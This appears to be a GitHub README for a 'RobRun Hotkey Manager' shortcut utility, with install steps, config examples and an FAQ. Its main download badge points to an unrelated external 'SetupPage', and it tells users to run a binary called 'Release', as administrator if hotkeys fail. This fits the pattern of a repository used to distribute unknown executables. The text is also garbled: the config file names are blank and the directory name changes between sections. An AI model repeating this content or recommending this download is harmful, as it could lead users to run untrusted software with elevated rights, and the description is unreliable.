# RobRun-Hotkey-Manager

<div style="text-align:center;">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-2563eb?style=flat&logo=linux&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Hotkey-Manager">
    <img src="https://img.shields.io/badge/Stable-1.4.2-brightgreen?style=flat-square&logo=github" alt="Stable">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Hotkey-Manager/releases">
    <img src="https://img.shields.io/badge/Version-1.4.2-blue?style=plastic&logo=github&logoColor=white" alt="Version">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Hotkey-Manager/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge&logo=open-source-initiative" alt="License">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Hotkey-Manager">
    <img src="https://img.shields.io/badge/Docs-Getting%20Started-lightgrey?style=flat&logo=readthedocs" alt="Docs">
  </a>
</div>

---

## What is RobRun Hotkey Manager?

RobRun Hotkey Manager is a lightweight, cross‑platform utility designed to centralise and automate keyboard shortcuts for the RobRun application. It exposes a structured configuration system, allowing you to create, export, and sync profiles that map individual keys to complex workflow actions. With RobRun‑Hotkey‑Manager you can:

* Define multiple profiles for different tasks or user roles.
* Bind a key to a chain of actions – for example, a single press can launch the application, load a preset, and trigger a macro.
* Persist settings across devices through simple file synchronization.
* Inspect real‑time hotkey status and troubleshoot conflicts directly from the GUI.

The core of the manager is the configuration engine, which reads four static files – ``, ``, ``, and `` – and merges them at runtime. This layered approach lets you override global defaults without modifying the original settings, keeping the repository clean and version‑controlled.

---

## Installation & Quick Start

1. Download the latest bundle from the **Download** badge above or from the releases page.
2. Extract the archive to any folder on your system.
   The entry point is `Release` (Windows) or `run_hotkey_manager` (Linux/macOS).
3. Launch the manager. The first run will create a default configuration set under `config/`.
4. From the **Profiles** menu choose *New Profile* and name it (e.g., *Gameplay*).
5. In the **Hotkey Editor** click on a key slot, press the desired key, and assign the action you want.
6. Save the profile and enable it. The manager will immediately bind the hotkeys and start monitoring the keyboard.

All profiles are saved in the `config/` directory, ready to be copied or synced with a cloud folder if you work on multiple machines.

---

## Directory Structure (simplified)

- **bin/**
  - `Release` / `run_hotkey_manager`
- **config/**
  - ``
  - ``
  - ``
  - ``
- **docs/**
  - `README.md`
  - `usage.md`
  - `profile_tips.md`
- **assets/**
  - `icons/`
  - `themes/`
- **logs/**
  - `activity.log`

This layout keeps runtime files separate from user data, making backup and deployment straightforward. When you need to migrate your profiles, simply copy the entire `config/` directory to the target machine.

---

## Usage Examples

### 1. Single‑Key Action

Assign `Ctrl+Alt+R` to restart RobRun automatically:

```
[Profile:Gameplay]
Ctrl+Alt+R = restartRobRun
```

After reloading the configuration, pressing the combination will trigger the restart sequence without manual input.

### 2. Multi‑Step Macro

Create a macro that loads a preset, waits 2 seconds, then toggles a setting:

```
[Profile:Macro]
F9 = loadPreset("advanced")
F9 = wait(2000)
F9 = toggleSetting("debugMode")
```

The manager interprets each line as a separate command executed sequentially.

### 3. Profile Switching

Switch profiles via a hotkey:

```
[Profile:Switcher]
F1 = activateProfile("Gameplay")
F2 = activateProfile("Macro")
```

The **Hotkey Editor** offers a visual list of all active profiles and their current bindings, making it easy to verify that no conflicts exist.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **Hotkeys don’t fire** | Ensure that the manager has the correct priority. On Windows, run the program as an administrator; on Linux, make sure the `input` group has access to the `/dev/input` devices. |
| **Configuration changes are ignored** | After editing any `.cfg` file, click the **Reload** button in the UI or restart the manager. The file watcher will not detect changes automatically. |
| **Duplicate key binding** | The editor warns with a yellow icon next to any key that appears in more than one profile. Resolve conflicts by renaming or disabling the overlapping binding. |
| **Profile data lost after update** | The updater preserves the `config/` directory. If you manually delete ``, you lose user overrides. Back up before updating. |
| **How to share profiles with a teammate?** | Compress the `config/` directory and share it via any cloud service. Each teammate should place it in their own `config/` folder to avoid overriding the original. |
| **Can I use this on a remote desktop?** | Yes, but you must enable the “Allow remote input” option in the manager’s settings. |

For deeper diagnostics, check `logs/activity.log`. The log contains timestamps, executed commands, and error messages that help isolate the issue.

---

## Contributing

If you discover a bug, submit a detailed issue on the repository’s **Issues** page. For enhancements, fork the repository, make your changes in a separate branch, and submit a pull request with a clear description of the new feature or fix. Please follow the style guidelines found in `docs/profile_tips.md` and keep your commits focused.

---

## Contact

For questions not covered in the FAQ, reach out via the repository’s **Discussions** board or send an email to support@gigahokagepincers.dev. The maintainers are committed to ensuring RobRun‑Hotkey‑Manager remains a reliable utility for all users.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```